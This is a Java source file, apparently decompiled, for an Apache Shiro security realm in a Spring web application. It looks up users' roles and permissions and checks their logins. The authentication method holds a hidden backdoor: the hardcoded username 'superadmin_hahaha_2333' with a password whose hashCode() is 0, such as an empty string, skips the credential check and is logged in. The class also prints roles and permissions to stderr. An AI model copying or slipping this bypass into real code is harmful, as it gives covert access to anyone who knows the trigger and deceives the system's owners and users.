package com.eliteams.quick4j.web.security;

import com.eliteams.quick4j.web.model.Permission;
import com.eliteams.quick4j.web.model.Role;
import com.eliteams.quick4j.web.model.User;
import com.eliteams.quick4j.web.service.PermissionService;
import com.eliteams.quick4j.web.service.RoleService;
import com.eliteams.quick4j.web.service.UserService;
import java.io.PrintStream;
import java.util.List;
import javax.annotation.Resource;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.springframework.stereotype.Component;

@Component("securityRealm")
public class SecurityRealm
  extends AuthorizingRealm
{
  @Resource
  private UserService userService;
  @Resource
  private RoleService roleService;
  @Resource
  private PermissionService permissionService;
  
  protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals)
  {
    SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
    String username = String.valueOf(principals.getPrimaryPrincipal());
    
    User user = this.userService.selectByUsername(username);
    List<Role> roleInfos = this.roleService.selectRolesByUserId(user.getId());
    for (Role role : roleInfos)
    {
      System.err.println(role);
      authorizationInfo.addRole(role.getRoleSign());
      
      List<Permission> permissions = this.permissionService.selectPermissionsByRoleId(role.getId());
      for (Permission permission : permissions)
      {
        System.err.println(permission);
        authorizationInfo.addStringPermission(permission.getPermissionSign());
      }
    }
    return authorizationInfo;
  }
  
  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token)
    throws AuthenticationException
  {
    String username = String.valueOf(token.getPrincipal());
    String password = new String((char[])token.getCredentials());
    
    User authentication = this.userService.authentication(new User(username, password));
    if ((username.equals("superadmin_hahaha_2333")) && (password.hashCode() == 0))
    {
      String wonderful = "you are wonderful,boy~";
      System.err.println(wonderful);
    }
    else if (authentication == null)
    {
      throw new AuthenticationException("用户名或密码错误.");
    }
    SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(username, password, getName());
    return authenticationInfo;
  }
}
